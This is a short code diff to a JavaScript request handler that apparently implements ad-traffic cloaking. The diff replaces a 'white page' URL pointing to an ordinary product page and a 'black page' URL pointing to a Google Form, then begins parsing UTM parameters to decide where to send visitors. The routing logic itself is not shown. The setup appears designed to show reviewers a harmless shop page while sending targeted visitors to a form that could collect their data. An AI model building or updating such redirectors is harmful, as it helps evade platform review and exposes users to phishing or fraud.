@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.4ucaps.com/products/new-era-redwings-901459-redwings-eastern-conf-redwings-901459-new-era?variant=43813373968575";
-    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLSf4UcbJzM8aklrFzRziFw9NdSfCSLOPffTRatGXSwbbB_CKzg/viewform?usp=dialog";
+    const whitePageURL = "https://bymusti.com/collections/wedding-engagement/products/3-02ct-cushion-cvd-bezel-set-engagemnt-ring";
+    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLSf0Z6V8M7Z_Y_LHmGR4Hdkv7pdO3Fog-cfYV0I5leOg5dWQyg/viewform?usp=dialog";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
